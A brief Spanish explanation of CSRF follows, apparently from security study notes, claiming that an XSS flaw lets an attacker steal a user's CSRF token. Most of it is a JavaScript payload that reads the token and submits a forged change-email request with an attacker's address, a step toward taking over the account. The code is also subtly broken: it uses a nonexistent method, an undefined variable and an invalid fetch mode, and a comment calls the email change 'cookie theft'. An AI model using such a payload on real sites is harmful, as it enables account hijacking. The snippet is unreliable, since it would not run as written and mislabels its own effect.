Un CSRF es un ataque que consiste en realizar ciertas acciones en nombre de otro usuario, algunas paginas, para protegerse de esto, utilizan un token CSRF, el cual es único por cada usuario, el problema es que podemos robar este token usando una vulnerabilidad XSS:

```html
<script>
window.addEventListener('DOMContentLoaded', function(){

var token = document.getElementByName('csrf')[0].value

data.append('csrf', token);
data.append('email', 'newemail@gmail.com'); // <- Robo de cookie


fetch('/change_email/path', {
	method: 'Post',
	mode: 'no_cors',
	body: data

});
});

</script>
```